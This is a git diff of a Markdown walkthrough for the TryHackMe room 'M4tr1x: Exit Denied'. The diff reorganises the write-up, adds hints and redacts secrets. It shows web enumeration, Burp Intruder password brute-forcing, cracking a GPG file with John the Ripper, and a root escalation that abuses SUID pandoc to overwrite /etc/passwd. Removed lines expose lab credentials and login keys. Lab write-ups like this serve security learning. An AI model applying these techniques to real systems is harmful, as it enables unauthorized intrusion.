@@ -1,5 +1,5 @@
 <h1 align="center">M4tr1x: Exit Denied</h1>
-<p align="center">2025, October 12<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>524</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
+<p align="center">2025, October 13<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>525</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
 <em>Free your mind. Exit from the M4tr1x...</em><br>
 <img width="80px" src="https://github.com/user-attachments/assets/c435a79d-756c-4e87-86b5-0c81a25e5f82"><br>
 Access it <a href="https://tryhackme.com/room/m4tr1xexitdenied">here</a>.<br>
@@ -33,8 +33,32 @@ Jason Yeh - https://www.deviantart.com/ecclo/art/Vector-Morpheus-5429472</h6>
 <p><em>Answer the questions below</em></p>
 
 <br>
+<h1 align="center">Summary</h1>
+<p>
+
+- [Static Host Name Mapping](#1)<br>  
+- [Port Scanning](#2)<br>
+- [Web Vulberability Scanning](#3)<br>
+- [Directory and File Enumeration](#4)<br>
+- [Web Interface Inspection](#5)<br>
+- [Directory and File Enumeration](#6)<br>
+- [Web Interface Inspection](#7)<br>
+- [Static Host Mapping](#8)<br>
+- [Weaponization](#9)<br>
+- [Delivery & Execution & Initial Foothold](#10)<br>
+- [Privilege Escalation & User Flag](#11)<br>
+- [Privilege Escalation & Root Flag](#12)</p>
+
 <br>
-<h1 align="center">Host Name Mapping<a id='1'></a></h1>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<h1 align="center">Static Host Name Mapping<a id='1'></a></h1>
 
 ```bash
 xx.xxx.xx.xx exitdenied.thm
@@ -62,7 +86,6 @@ PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
 3306/tcp open  mysql
-...
 ```
 
 ```bash
@@ -153,6 +176,8 @@ http://exitdenied.thm/change_password      (Status: 200) [Size: 240]
 <br>
 <br>
 <br>
+<br>
+<h1 align="center">Web Interface Inspection<a id='5'></a></h1>
 <p align="center">exitdenied.thm/general</p>
 
 <img width="1137" height="726" alt="image" src="https://github.com/user-attachments/assets/9998cb7e-f2ee-42d5-93d4-72d9721b3c13" />
@@ -188,6 +213,7 @@ http://exitdenied.thm/change_password      (Status: 200) [Size: 240]
 <br>
 <br>
 <br>
+<h1 align="center">Directory and File Enumeration<a id='6'></a></h1>
 
 ```bash
 :~/M4tr1xExitDenied# gobuster dir -u http://exitdenied.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -q -x php,txt,js,bak
@@ -252,6 +278,10 @@ http://exitdenied.thm/editpost.php         (Status: 200) [Size: 9603]
 <br>
 <br>
 <br>
+<p>1.1. Where did that white <ins>rabbit</ins> lead you to? Hint: <em>Gobuster</em><br>
+<code>No answer needed/code></p>
+<br>
+<h1 align="center">Web Interface Inspection<a id='7'></a></h1>
 <p align="center">exitdenied.thm/index.php</p>
 
 <img width="1137" height="770" alt="image" src="https://github.com/user-attachments/assets/b424c517-4b6f-48ac-b7b3-8cfa7d438dd2" />
@@ -266,7 +296,7 @@ http://exitdenied.thm/editpost.php         (Status: 200) [Size: 9603]
 <br>
 <br>
 <br>
-<p align="center">exitdenied.thm/showteam.php<br>Administrator : bigpaul<br>Moderators: ArnoldBagger, BlackCat, BlueMan, DotHaxer, DrBert, Jackwom, PalaceKing<br>Super Moderator: BlackCat</p>
+<p align="center">exitdenied.thm/showteam.php<br>Administrator : <code>bigpaul</code><br>Moderators: <code>ArnoldBagger</code>, <code>BlackCat</code>, BlueMan, DotHaxer, DrBert, Jackwom, <code>PalacerKing</code><br>Super Moderator: <code>BlackCat</code></p>
 
 <img width="1133" height="807" alt="image" src="https://github.com/user-attachments/assets/7fc28b2a-087c-4318-b57d-db85fa82e43b" />
 
@@ -300,15 +330,15 @@ PalaceKing
 <br>
 <br>
 <br>
-<p align="center">Team > bigpaul > Threads > Bug Bounty Program<br>bugbountyHQ</p>
+<p align="center"><code>Team</code> > <code>bigpaul</code> > <code>Threads</code> > <code>Bug Bounty Program</code><br><code>/bugbountyHQ</code></p>
 
 <img width="1134" height="754" alt="image" src="https://github.com/user-attachments/assets/65d6391a-ceaa-4115-9b69-4dd0932d4645" />
 
 <br>
 <br>
 <br>
-<p>1.2. Where did that white rabbit lead you to?<br>
-<code>/resportPanel.php</code></p>
+<p>1.2. Where did that white <ins>rabbit</ins> lead you to? Hint: <em>Are you sure it is trying to lead you down just one stop? Perhaps the journey is longer?</em><br>
+<code>/reportPanel.php</code></p>
 <br>
 <p align="center">exitdenied.thm/bugbountyHQ<br>/reportPanel.php</p>
 
@@ -323,21 +353,21 @@ PalaceKing
 <br>
 <br>
 <br>
-<p align="center">exitdenied.thm/reportPanel.php<br><br>deleted mod posts with attachments can still be accessed</p>
+<p align="center">exitdenied.thm/reportPanel.php<br><br><em>deleted <code>mod</code> posts with attachments can still be accessed</em></p>
 
 <img width="1131" height="299" alt="image" src="https://github.com/user-attachments/assets/0cfda2f2-4d63-49e4-aab4-6bd4a6208d13" />
 
 <br>
 <br>
 <br>
-<p align="center">3 in 5 online users use weak passwords such as: password123, Password123, crabfish, linux123, secret, piggybank, windowsxp, starwars, qwerty123, qwerty, supermario, Luisfactor05, james123, ect</p>
+<p align="center"><em>3 in 5 online users use weak passwords such as: password123, Password123, crabfish, linux123, secret, piggybank, windowsxp, starwars, qwerty123, qwerty, supermario, Luisfactor05, james123, etc</em></p>
 
 <img width="1122" height="184" alt="image" src="https://github.com/user-attachments/assets/91e619bd-f8ad-4694-8ec7-2fe2c67bfca8" />
 
 <br>
 <br>
 <br>
-<p align="center">exitdenied.thm/reportPanel.php page source/p>
+<p align="center">exitdenied.thm/reportPanel.php page source</p>
 
 <img width="1129" height="258" alt="image" src="https://github.com/user-attachments/assets/1a5016d1-191c-41ac-9a4c-1881e44eb5a5" />
 
@@ -372,7 +402,7 @@ james123
 ```
 
 <br>
-<p>1.3. Determine which vulnerability is the most appropriate at this time.<br>
+<p>1.3. Determine which vulnerability is the most appropriate at this time. Hint: <em>Date: x/x/21</em><br>
 <code>No answer needed</code></p>
 <br>
 
@@ -381,36 +411,35 @@ james123
 <br>
 <br>
 <br>
-<p align="center">anti-bot registration questions repeats using pseudo random method - can be predicted using frequency analysis of responses</p>
+<p align="center"><em>anti-bot registration questions repeats using pseudo random method - can be predicted using frequency analysis of responses</em></p>
 
 <img width="1126" height="37" alt="image" src="https://github.com/user-attachments/assets/e310c6e0-e493-45ac-9aac-8f20a6e0ec9b" />
 
 <br>
 <br>
 <br>
-<p align="center">IP history plugin records users IP & User-Agent history. user Agent would not be sanitized so xss possible for <code>acp</code> page.</p>
+<p align="center"><em>IP history plugin records users IP & User-Agent history. user Agent would not be sanitized so xss possible for <code>acp</code> page</em>.</p>
 
 <img width="1123" height="296" alt="image" src="https://github.com/user-attachments/assets/a1731731-27e9-42d8-a444-ee13015a007b" />
     
 <br>
 <br>
 <br>
-<p align="center">xss possible because plugin does not sanatize passed data (AR4)</p>
+<p align="center"><em>xss possible because plugin does not sanatize passed data (AR4)</em></p>
 
 <img width="1118" height="31" alt="image" src="https://github.com/user-attachments/assets/e8750aeb-209d-41f5-a3d7-3df7f482f096" />
 
 <br>
 <br>
 <br>
-<p align="center">Launched Burp Suite, and enabled FoxyProxy.<br>Captured the login of the account registered previously. Sent to intruder. <code>Start attack</code>.</p>
+<p align="center">Launched <code>Burp Suite</code>, and enabled <code>FoxyProxy</code>.<br>Captured the login of the account registered previously.<br>Sent to intruder.<br>Clicked <code>Start attack</code>.<br>Identified <code>PalacerKing</code>´s and <code>ArnoldBagger</code>´s passwords.</p>
 
 <img width="1171" height="303" alt="image" src="https://github.com/user-attachments/assets/deb0fdea-e141-4351-a1ff-27cea6181791" />
 
 <br>
 <br>
 <br>
-
-<p align="center">PalacerKing<br><code>10</code></p>
+<p align="center"><code>PalacerKing</code><br><code>10</code></p>
 
 <img width="1119" height="608" alt="image" src="https://github.com/user-attachments/assets/84461095-bcbe-436a-b1c3-4da16382199e" />
 
@@ -423,8 +452,7 @@ james123
 <br>
 <br>
 <br>
-
-<p align="center">PalacerKing > User CP > Messenger > Sent Items > new plugin test</p>
+<p align="center"><code>PalacerKing</code> > <code>User CP</code> > <code>Messenger</code> > <code>Sent Items</code> > <code>new plugin test</code></p>
 
 <img width="1060" height="365" alt="image" src="https://github.com/user-attachments/assets/a53109a2-eb25-46ae-9719-d0df7a9987a2" />
 
@@ -432,7 +460,7 @@ james123
 <br>
 <br>
 
-<p align="center">ArnoldBagger > User CP > Messenger > Sent Items</p>
+<p align="center"><code>ArnoldBagger</code> > <code>User CP</code> > <code>Messenger</code> > <code>Sent Items</code></p>
 
 <img width="1118" height="571" alt="image" src="https://github.com/user-attachments/assets/27b29184-a959-45d5-9380-25aae5d17d74" />
 
@@ -448,7 +476,7 @@ james123
 <p>1.4. What is the name of that interesting plugin?<br>
 <code>modManagerv2</code></p>
 <br>
-<p align="center">/devBuilds</p>
+<p align="center"><code>/devBuilds</code></p>
 
 <img width="1129" height="372" alt="image" src="https://github.com/user-attachments/assets/bca3dcd5-8fda-4d20-a180-aba23ca5e8d0" />
 
@@ -461,17 +489,15 @@ james123
 <br>
 <br>
 <br>
-<p align="center">inc/tools/manage/SQL/p.txt'</p>
+<p align="center">inc/tools/manage/SQL/<code>p.txt</code></p>
 
 <img width="1124" height="477" alt="image" src="https://github.com/user-attachments/assets/594e6dc6-5666-46d3-90fa-709265ce8803" />
 
 <br>
 <br>
 <br>
-<p>1.5. What is the name of that encrypted file that you found?<br>
-<code>p.txt.gpg</code></p>
 <br>
-
+<p align="center">Copy <code>p.txt.gpg</code> and <code>modManagerv2.plugin</code>.</p>
 
 ```bash
 :~/M4tr1xExitDenied# wget http://exitdenied.thm/devBuilds/p.txt.gpg
@@ -489,12 +515,10 @@ p.txt.gpg                            100%[======================================
 ```
 
 <br>
+<p>1.5. What is the name of that encrypted file that you found?<br>
+<code>p.txt.gpg</code></p>
 <br>
-<br>
-<p>1.6. Interesting... I believe only the keymaker could help you crack it. Find him. Where did he tell you to go to?<br>
-<code>/0100101101100101011110010110110101100001011010110110010101110010</code></p>
-<br>
-<p align="center">exitdenied.thm/reportPanel.php page source/p>
+<p align="center">Identifiy <ins>keymaker message</ins> on exitdenied.thm/reportPanel.php page source./p>
 
 ```bash
 Keymaker message:
@@ -504,11 +528,11 @@ Keymaker message:
 ```
 
 <br>
-<p>1.7. Did you try cracking the file?<br>
-<code>No answer needed</code></p>
+<p>1.6. Interesting... I believe only the keymaker could help you crack it. Find him. Where did he tell you to go to? Hint: <em>Page Source</em><br>
+<code>/0100101101100101011110010110110101100001011010110110010101110010</code></p>
 <br>
-
-<p align="center">https://planetcalc.com/4884/</p>
+<br>
+<p align="center">Navigate to https://planetcalc.com/4884/ and decode <ins>keymaker message</ins>.</p>
 
 <img width="1429" height="646" alt="image" src="https://github.com/user-attachments/assets/f4dc860c-fea4-434a-b07f-42c13a6a8d33" />
 
@@ -532,7 +556,12 @@ a p e r m u t a t i o n o f o n l y t h e e n g l i s h l e t t e r s w i l l o 
 a d d r e s s
 ```
 
-<p align="center">/0100101101100101011110010110110101100001011010110110010101110010</p>
+<br>
+<p>1.7. Did you try cracking the file? Hint: <em>Itertools.Permutations() is one possible solution among several</em>.<br>
+<code>No answer needed</code></p>
+<br>
+<br>
+<p align="center">Navigate to <code>exitdenied.thm/0100...</code></p>
 
 <img width="1112" height="273" alt="image" src="https://github.com/user-attachments/assets/b8eb7ad0-bbab-434d-a291-8987570475e1" />
 
@@ -540,18 +569,16 @@ a d d r e s s
 <br>
 <br>
 
-<p align="center">view-source:http://exitdenied.thm/0100101101100101011110010110110101100001011010110110010101110010<br>
-ofqxvg</p>
+<p align="center">View its source code.<br>Identify <em>f v g o x q</em>.</p>
 
 <img width="1133" height="327" alt="image" src="https://github.com/user-attachments/assets/becc0e87-e66e-4d85-b244-a8ec0f0931d3" />
 
 <br>
 <br>
 <br>
-
+<p align="center">Create <code>worlist.txt</code> based on permutation of <em>f v g o x q</em>.</p>
 
 ```bash
-:~/M4tr1xExitDenied# cat script.py
 import itertools
 
 #English letters: 
@@ -565,18 +592,21 @@ with open("wordlist.txt", "w") as f:
         f.close
 ```
 
-wordlist.txt
-
 ```bash
 :~/M4tr1xExitDenied# python3 script.py
 ```
 
+<br>
+<p align="center">Convert <code>p.txt.gpg</code> to John The Ripper´s format.<br>Save the output in <code>A</code>.</p>
 
 ```bash
 :~/M4tr1xExitDenied# /usr/local/bin/gpg2john p.txt.gpg > A
 
 File p.txt.gpg
 ```
+
+<br>
+<p align="center">Identify the passphrase ------ using the hash <code>A</code> and the wordlist <code>worlist.txt</code> with John The Ripper.</p>
 
 ```bash
 :~/M4tr1xExitDenied# john --wordlist=wordlist.txt A
@@ -595,6 +625,9 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
+<br>
+<p align="center">Extract the database password ------------ using <code>gpg</code> against the file <code>p.txt.gpg</code>, copied previously.</p>
+
 ```bash
 :~/M4tr1xExitDenied# gpg -d p.txt.gpg
 gpg: AES256 encrypted data
@@ -603,9 +636,7 @@ gpg: encrypted with 1 passphrase
 ```
 
 <br>
-<p>1.8. What is the login_key of Ellie?<br>
-<code>**************************************************</code></p>
-<br>
+<p align="center">Access the database using <code>mysql</code>.</p>
 
 ```bash
 :~/M4tr1xExitDenied# mysql -h xx.xxx.xx.xx -u mod -p
@@ -618,6 +649,13 @@ Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
+MariaDB [(none)]>
+```
+
+<br>
+<p align="center">Query the database and identify user´s hashes.</p>
+
+```bash
 MariaDB [(none)]> show DATABASES;
 +--------------------+
 | Database           |
@@ -672,11 +710,13 @@ MariaDB [modManagerv2]> SELECT * FROM members;
 MariaDB [modManagerv2]> 
 ```
 
-<br>
-
 <img width="1063" height="790" alt="image" src="https://github.com/user-attachments/assets/19964504-52c0-4939-a665-3a2c0bf02ceb" />
 
 <br>
+<br>
+<br>
+<p>1.8. What is the login_key of Ellie? Hint: <em>What is a login_key and where would mybb store login_keys? Research time...</em><br>
+<code>**************************************************</code></p>
 <br>
 <br>
 
@@ -685,8 +725,7 @@ MariaDB [modManagerv2]>
 <br>
 <br>
 <br>
-
-<p align="center">Learned about <code>login_key</code> here: https://docs.mybb.com/1.6/Database-Tables-mybb-users/</p>
+<p align="center">Learn about <code>login_key</code> here: https://docs.mybb.com/1.6/Database-Tables-mybb-users/</p>
 
 <img width="1278" height="294" alt="image" src="https://github.com/user-attachments/assets/33c50171-f025-45e5-9670-a235cceec312" />
 
@@ -713,15 +752,8 @@ MariaDB [modManagerv2]>
 <br>
 <br>
 <br>
-<p align="center">SSH = TOTP, Time-based One-Time Password</p>
-
-<p>1.9. What is the name of that secret algorithm? (answer format: acronym)<br>
-<code>SSH-TOTP</code></p>
-<br>
-<br>
-<br>
 <p align="center">Inspect <code>BlackCat</code>´s files.</p>
-
+<br>
 <p align="center">SSH-TOP documentation.pdf</p>
 
 <img width="1125" height="674" alt="image" src="https://github.com/user-attachments/assets/913539a8-b0c4-4b55-a716-a46ff6e7bacd" />
@@ -743,7 +775,7 @@ MariaDB [modManagerv2]>
 <br>
 <br>
 <br>
-<p align="center"> <code>hardwareToken.jpg</code> = <code>446662</code></p>
+<p align="center"><code>hardwareToken.jpg</code> = <code>446662</code></p>
 
 <img width="1118" height="474" alt="image" src="https://github.com/user-attachments/assets/703339e9-8104-471c-a119-efae25e6c60f" />
 
@@ -757,14 +789,14 @@ MariaDB [modManagerv2]>
 <br>
 <br>
 <br>
-<p align="center">Extracted <code>testing.zip</code> -> <code>hardwareToken.jpg</code> and <code>testing.png</code></p>
+<p align="center">Extract <code>testing.zip</code> -> <code>hardwareToken.jpg</code> and <code>testing.png</code></p>
 
 <img width="789" height="255" alt="image" src="https://github.com/user-attachments/assets/ae8a0dd0-cdf9-45c7-b3b4-5cb33bac58cf" />
 
 <br>
 <br>
 <br>
-<p align="center">Extracted <code>DevTools.zip</code> -> <code>ntp_syncer.py</code> and <code>timeSimulatorClient.py</code></p>
+<p align="center">Extract <code>DevTools.zip</code> -> <code>ntp_syncer.py</code> and <code>timeSimulatorClient.py</code></p>
 
 <img width="792" height="340" alt="image" src="https://github.com/user-attachments/assets/f59c7867-dc62-436a-9a32-0840420226d1" />
 
@@ -777,11 +809,18 @@ MariaDB [modManagerv2]>
 <br>
 <br>
 <br>
+<p align="center">SSH = TOTP, Time-based One-Time Password</p>
+<br>
+<br>
+<p>1.9. What is the name of that secret algorithm? (answer format: acronym). Hint : <em>What does the documentation say?</em><br>
+<code>SSH-TOTP</code></p>
+<br>
+<br>
+<br>
 
 ```bash
 :~/M4tr1xExitDenied/DevTools# pip3 install ntplib
 ```
-
 
 ```bash
 :~/M4tr1xExitDenied/DevTools# ls
@@ -805,10 +844,10 @@ import subprocess
 import os
 import ntplib
 
-targetIPAdress = "10.201.17.255"
-sharedSecret1 = 128939448577488
-sharedSecret2 = 592988748673453
-sharedSecret3 = 792513759492579
+targetIPAdress = "xx.xxx.xx.xxx"
+sharedSecret1 = ◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘
+sharedSecret2 = ◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘
+sharedSecret3 = ◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘
 
 class TimeSimulatorClient:
     def __init__(self, sharedSecret1, sharedSecret2, sharedSecret3, targetIPAdress):
@@ -903,36 +942,32 @@ if __name__ == '__main__':
     main()
 ```
 
-
 ```bash
 :~/M4tr1xExitDenied# python3 script.py
-/usr/lib/python3/dist-packages/paramiko/transport.py:220: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed in a future release
-  "class": algorithms.Blowfish,
 _______________  Setting timezone to UTC ....
 _______________  Before: 
-sudo: unable to resolve host ip-10-201-64-97: Name or service not known
-               Local time: Mon 2025-10-13 21:53:57 UTC
-           Universal time: Mon 2025-10-13 21:53:57 UTC
-                 RTC time: Mon 2025-10-13 21:53:57    
+
+               Local time: Mon 2025-10-13 xx:xx:xx UTC
+           Universal time: Mon 2025-10-13 xx:xx:xx UTC
+                 RTC time: Mon 2025-10-13 xx:xx:xx    
                 Time zone: UTC (UTC, +0000)           
 System clock synchronized: yes                        
               NTP service: active                     
           RTC in local TZ: no                         
-sudo: unable to resolve host ip-10-201-64-97: Name or service not known
+
 _______________  Timezone changed to UTC.
 _______________ Synced to the time server.
-_____________________________________________ Found the correct OTP! architect:1f014c60d1292bcda5b100
+_____________________________________________ Found the correct OTP! architect:♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦
 ```
 
+<br>
 
 <img width="1145" height="291" alt="image" src="https://github.com/user-attachments/assets/19c13c65-932c-4d61-9c35-fd2e5bd1ccac" />
 
 <br>
 <br>
 <br>
-
-<br>
-<p>1.10. SSH login...<br>
+<p>1.10. SSH login... Hint: <em>It might be using the UTC time-zone</em><br>
 <code>No answer needed</code></p>
 <br>
 
@@ -960,6 +995,7 @@ fL4g{*************************}
 <br>
 <p>1.11. What is the user flag?<br>
 <code>fL4g{*************************}</code></p>
+<br>
 <br>
 
 
@@ -996,6 +1032,16 @@ architect@...:~$ find / -perm -4000 2>/dev/null
 /bin/umount
 ```
 
+<br>
+<br>
+<p>GTFObins Pandoc: https://gtfobins.github.io/gtfobins/pandoc/#suid</p>
+
+<img width="1102" height="310" alt="image" src="https://github.com/user-attachments/assets/a1455292-5cc3-43cb-b3e6-6ecd466fe85d" />
+
+<br>
+<br>
+<br>
+
 ```bash
 architect@...:~$ ls -la /usr/bin/pandoc
 -rwsr-sr-x 1 root root 80908912 Mar  8  2021 /usr/bin/pandoc
@@ -1007,104 +1053,17 @@ pandoc [OPTIONS] [FILES]
   -f FORMAT, -r FORMAT  --from=FORMAT, --read=FORMAT                    
   -t FORMAT, -w FORMAT  --to=FORMAT, --write=FORMAT                     
   -o FILE               --output=FILE                                   
-                        --data-dir=DIRECTORY                            
-  -M KEY[:VALUE]        --metadata=KEY[:VALUE]                          
-                        --metadata-file=FILE                            
-  -d FILE               --defaults=FILE                                 
-                        --file-scope                                    
-  -s                    --standalone                                    
-                        --template=FILE                                 
-  -V KEY[:VALUE]        --variable=KEY[:VALUE]                          
-                        --wrap=auto|none|preserve                       
-                        --ascii                                         
-                        --toc, --table-of-contents                      
-                        --toc-depth=NUMBER                              
-  -N                    --number-sections                               
-                        --number-offset=NUMBERS                         
-                        --top-level-division=section|chapter|part       
-                        --extract-media=PATH                            
-                        --resource-path=SEARCHPATH                      
-  -H FILE               --include-in-header=FILE                        
-  -B FILE               --include-before-body=FILE                      
-  -A FILE               --include-after-body=FILE                       
-                        --no-highlight                                  
-                        --highlight-style=STYLE|FILE                    
-                        --syntax-definition=FILE                        
-                        --dpi=NUMBER                                    
-                        --eol=crlf|lf|native                            
-                        --columns=NUMBER                                
-  -p                    --preserve-tabs                                 
-                        --tab-stop=NUMBER                               
-                        --pdf-engine=PROGRAM                            
-                        --pdf-engine-opt=STRING                         
-                        --reference-doc=FILE                            
-                        --self-contained                                
-                        --request-header=NAME:VALUE                     
-                        --no-check-certificate                          
-                        --abbreviations=FILE                            
-                        --indented-code-classes=STRING                  
-                        --default-image-extension=extension             
-  -F PROGRAM            --filter=PROGRAM                                
-  -L SCRIPTPATH         --lua-filter=SCRIPTPATH                         
-                        --shift-heading-level-by=NUMBER                 
-                        --base-header-level=NUMBER                      
-                        --strip-empty-paragraphs                        
-                        --track-changes=accept|reject|all               
-                        --strip-comments                                
-                        --reference-links                               
-                        --reference-location=block|section|document     
-                        --atx-headers                                   
-                        --markdown-headings=setext|atx                  
-                        --listings                                      
-  -i                    --incremental                                   
-                        --slide-level=NUMBER                            
-                        --section-divs                                  
-                        --html-q-tags                                   
-                        --email-obfuscation=none|javascript|references  
-                        --id-prefix=STRING                              
-  -T STRING             --title-prefix=STRING                           
-  -c URL                --css=URL                                       
-                        --epub-subdirectory=DIRNAME                     
-                        --epub-cover-image=FILE                         
-                        --epub-metadata=FILE                            
-                        --epub-embed-font=FILE                          
-                        --epub-chapter-level=NUMBER                     
-                        --ipynb-output=all|none|best                    
-  -C                    --citeproc                                      
-                        --bibliography=FILE                             
-                        --csl=FILE                                      
-                        --citation-abbreviations=FILE                   
-                        --natbib                                        
-                        --biblatex                                      
-                        --mathml                                        
-                        --webtex[=URL]                                  
-                        --mathjax[=URL]                                 
-                        --katex[=URL]                                   
-                        --gladtex                                       
-                        --trace                                         
-                        --dump-args                                     
-                        --ignore-args                                   
-                        --verbose                                       
-                        --quiet                                         
-                        --fail-if-warnings                              
-                        --log=FILE                                      
-                        --bash-completion                               
-                        --list-input-formats                            
-                        --list-output-formats                           
-                        --list-extensions[=FORMAT]                      
-                        --list-highlight-languages                      
-                        --list-highlight-styles                         
-  -D FORMAT             --print-default-template=FORMAT                 
-                        --print-default-data-file=FILE                  
-                        --print-highlight-style=STYLE|FILE              
-  -v                    --version                                       
-  -h                    --help                               
+                        --data-dir=DIRECTORY                                  
+...                       
 ```
 
+<br>
+<br>
+
 ```bash
-architect@...:~$ openssl passwd Passw0rd1!
+architect@...:~$ openssl passwd ♠♠♠♠♠♠♠♠♠♠
 Warning: truncating password to 8 characters
-.lRSmBD/iDF6g
+⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂
 ```
 
 ```bash
@@ -1119,8 +1078,11 @@ architect@...:~$ nano passwd
 
 ```bash
 architect@...:~$ cat passwd
-root:.lRSmBD/iDF6g:0:0:root:/root:/bin/bash
+root:⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂:0:0:root:/root:/bin/bash
 ```
+
+<br>
+<br>
 
 ```bash
 architect@...:~$ pandoc passwd -t plain -o /etc/passwd
@@ -1155,58 +1117,32 @@ drwx------  2 root root 4.0K Dec 30  2020 .ssh
 ```bash
 root@...:/#cat .mysql_history
 CREATE DATABASE mybb;
-CREATE USER 'mybbuser'@'localhost' IDENTIFIED BY 'prefixnulledcerv9';
-GRANT ALL ON mybb.* TO 'mybbuser'@'localhost' WITH GRANT OPTION;
 ...
 CREATE DATABASE modManagerv2;
 show databases;
 use modManagerv2;
-create table members(user VARCHAR(100) NOT NULL, login_key VARCHAR(40) NOT NULL);
 ...
 INSERT INTO members(user, login_key) 
-...
-LOAD DATA INFILE /tmp/data.txt INTO TABLE modManagerv2;
-LOAD DATA INFILE '/tmp/data.txt' INTO TABLE modManagerv2;
-LOAD DATA INFILE '/tmp/data.txt' INTO TABLE modManagerv2.members;
-commit;
 ...
 LOAD DATA INFILE '/tmp/data.txt' INTO TABLE members;
 ...
 select * from members;
-INSERT INTO members(user, login_key) VALUES('Wannabe_Hacker', 'LsVBnPTZGeUw6JkmMKFrzkSIUPu5TC0Nej8DAjwYXenQcCFEpv');
-INSERT INTO members(user, login_key) VALUES('batmanZero', 'TBTZq6GfniPvFfb2A3rA2mQoThcb5U7irVF5lLpr0L4cJcy5m9');
-INSERT INTO members(user, login_key) VALUES('SandraJannit', '6V5H71ZnvoW0FFbXx97YsV9LSnT4mltu9XB1v8qPo2X2CvfWBS');
-INSERT INTO members(user, login_key) VALUES('biggieballo', '75mXme5o0eY2o68sqeGBlTDvZcyJKmBhxUAusxiv6b816QilCG');
-INSERT INTO members(user, login_key) VALUES('AimsGregger', 'Xj8nuWt5Xn9UYzpIha1q2Fk4GUjyrEPPbpchDCwnniUO0ZzZyf');
-INSERT INTO members(user, login_key) VALUES('BlackCat', 'c8M7tBAWQSdcgTsHdXOCktrnXdAyLgcRzZhhffoNKyAQmxtTBY');
-INSERT INTO members(user, login_key) VALUES('Golderg', 'clkNBtIoKICfzm6joGE2lTUiF2T8sVUfhtb2Aksst8zTRK2842');
-INSERT INTO members(user, login_key) VALUES('TonyMontana', '8CtllQvd9V2qqHv0ZSjUj3PzuTSD37pam4ld8YjlB7gDN0zVwE');
-INSERT INTO members(user, login_key) VALUES('CaseBrax', 'eHXBFESqEoE5Ba2gcOjD8oBMJcgNRkazcJOc8wQQ9mGVRpMdvU');
-INSERT INTO members(user, login_key) VALUES('Ellie', 'G9KY2siJp9OOymdCiQclQn9UhxL6rSpoA3MXHCDgvHCcrCOOuT');
-INSERT INTO members(user, login_key) VALUES('Sosaxvector', 'RURFzCfyEIBeTE3yzgQDY34zC9jWqiBwSnyzDooH33fSiYr9ci ');
-INSERT INTO members(user, login_key) VALUES('PalacerKing', '49wrogyJpIQI834MlhDnDnbb3Zlm0tFehnpz8ftDroesKNGbAX');
-INSERT INTO members(user, login_key) VALUES('Anderson', 'lkJVgYjuKl9P4cg8WUb8XYlLsWKT4Zxl5sT9rgL2a2d5pgPU1w ');
-INSERT INTO members(user, login_key) VALUES('CrazyChris', 'tpM9k17itNHwqqT7b1qpX8dMq5TK83knrDrYe6KmxgiztsS1QN ');
-INSERT INTO members(user, login_key) VALUES('StaceyLacer', 'QD8HpoWWrvP1I7kC4fvTaEEunlUz2ABgFUG5Huj8nqeInlz7df');
-INSERT INTO members(user, login_key) VALUES('ArnoldBagger', 'OoTfmlJyJhdJiqHXucrvRueHvGhE6LnBi5ih27KLQBKfigQLud ');
-INSERT INTO members(user, login_key) VALUES('Carl_Dee', '3mPkPyBRwo67MOrJCOW8JDorQ8FvLpuCnreGowYrMYymVvDDXr');
-INSERT INTO members(user, login_key) VALUES('Xavier', 'ZBs4Co6qovOGI7H9FOI1qPhURDOagvBUgdXo8gphst8DhIyukP');
 ...
-CREATE USER 'mod'@'%' IDENTIFIED BY 'myS3CR3TPa55';
-GRANT SHOW DATABASES ON *.* TO `mod`@`%` identified by 'myS3CR3TPa55'; 
+CREATE USER 'mod'@'%' IDENTIFIED BY '------------';
+GRANT SHOW DATABASES ON *.* TO `mod`@`%` identified by '------------'; 
 FLUSH PRIVILEGES;
 select host, user, password from mysql.user;
 commit;
 FLUSH PRIVILEGES;
-GRANT SELECT ON `modManagerv2`.* TO `mod`@`%` IDENTIFIED BY \u2018myS3CR3TPa55\u2019;
-GRANT SELECT ON 'modManagerv2'.* TO 'mod'@'%' IDENTIFIED BY 'myS3CR3TPa55';
+GRANT SELECT ON `modManagerv2`.* TO `mod`@`%` IDENTIFIED BY \u2018m------------\u2019;
+GRANT SELECT ON 'modManagerv2'.* TO 'mod'@'%' IDENTIFIED BY '------------';
 GRANT SELECT ON `modManagerv2`.* TO `mod`@`%`;
 commit;
 ...
 ```
 
 ```bash
-root@ip-10-201-17-255:~# cat '/etc/-- -root.py'
+root@...:~# cat '/etc/-- -root.py'
 from progress.bar import FillingSquaresBar
 import time
 
@@ -1244,6 +1180,10 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 <img width="1118" height="232" alt="image" src="https://github.com/user-attachments/assets/a11776eb-90df-49e8-be07-5ca78ed8d6ff" />
 
+<br>
+<br>
+<br>
+
 ```bash
 Flag{•••••••••4507•••••••••}
 ```
@@ -1253,7 +1193,6 @@ Flag{•••••••••4507•••••••••}
 <code>Flag{•••••••••4507•••••••••}</code></p>
 <br>
 <br>
-
 
 ```bash
 root@...:/# find / -perm -4000 -exec ls -l {} \;
@@ -1277,18 +1216,12 @@ root@...:/# find / -perm -4000 -exec ls -l {} \;
 -rwsr-xr-x 1 root root 39144 Apr  9  2024 /bin/umount
 ```
 
+<br>
+<p align="center">/etc</p>
+
 ```bash
 root@...:/# find / -type f -name "*root*" 2>/dev/null
-/lib/systemd/system/initrd-switch-root.service
